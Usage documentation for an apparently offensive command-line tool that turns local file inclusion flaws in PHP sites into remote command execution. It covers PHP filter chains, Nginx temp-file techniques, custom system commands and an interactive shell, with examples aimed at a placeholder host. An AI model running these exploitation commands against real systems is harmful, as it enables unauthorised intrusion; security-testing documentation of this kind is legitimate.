# Elle-Est-Fit CLI Documentation



## Basic Usage

```bash
elle-est-fit --url 'http://vulnerable.com/?page=FUZZ' [options]
```

Replace `FUZZ` in the URL with the placeholder where the LFI payload should be injected.

## Command-Line Options

### Target Options
- `--url URL`: Target URL with LFI vulnerability (use FUZZ as the placeholder for the LFI path)

### Technique Options
- `--technique NAME`: Specify a particular technique to use (default: auto-detect)
- `--list-techniques`: Display all available exploitation techniques
- `--dump-chain CODE`: Generate and display a PHP filter chain for the given PHP code
- `--test-chain CHAIN`: Test a specific PHP filter chain against the target URL

### Encoding Options
- `--double-url-encode`: Apply double URL encoding to the payload
- `--tamper CODE`: Python code for custom tampering function

### Payload Options
- `--php CODE`: Custom PHP code to execute
- `--custom-cmd CMD`: Custom system command to execute

### Output Options
- `-v, --verbose`: Enable verbose output for debugging
- `-q, --quiet`: Suppress non-essential output
- `--interactive`: Start an interactive shell after successful exploitation

## Examples

1. Basic exploitation with PHP filters technique:
```bash
elle-est-fit --url 'http://vulnerable.com/?page=FUZZ' --technique php_filters
```

2. Execute a custom command with double URL encoding:
```bash
elle-est-fit --url 'http://vulnerable.com/?page=FUZZ' --double-url-encode --custom-cmd 'id'
```

3. Use Nginx temporary files technique with custom PHP code:
```bash
elle-est-fit --url 'http://vulnerable.com/?page=FUZZ' --technique nginx_temp_files --php 'passthru("id");'
```

4. Generate a PHP filter chain without targeting a URL:
```bash
elle-est-fit --dump-chain '<?php phpinfo(); ?>'
```

5. Start an interactive shell after exploitation:
```bash
elle-est-fit --url 'http://vulnerable.com/?page=FUZZ' --interactive
```

## Interactive Shell

When using the `--interactive` flag, you'll get access to an interactive shell where you can:
- Execute system commands directly
- Type 'exit' or 'quit' to leave the shell
- Use Ctrl+C to interrupt operations

## Error Handling

The tool provides different levels of error output:
- Use `--verbose` for detailed error messages and debugging information
- HTTP 414 errors may occur with long payloads - try shorter payloads in such cases
- The tool will display clear error messages for common issues like missing URLs or invalid techniques

## Version Information

You can check the tool's version using:
```bash
elle-est-fit --version
```